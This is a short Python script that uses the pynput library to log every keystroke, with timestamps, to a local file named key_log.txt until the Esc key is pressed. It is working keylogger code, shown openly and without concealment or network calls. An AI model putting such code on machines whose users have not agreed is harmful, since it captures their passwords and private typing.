from pynput.keyboard import Key, Listener

import logging

log_dir = ""
#log key strokes to txt file
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')
#function to register key press, if statement to stop script
def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return False
#turns on listener
with Listener(on_press=on_press) as listener:
    listener.join()
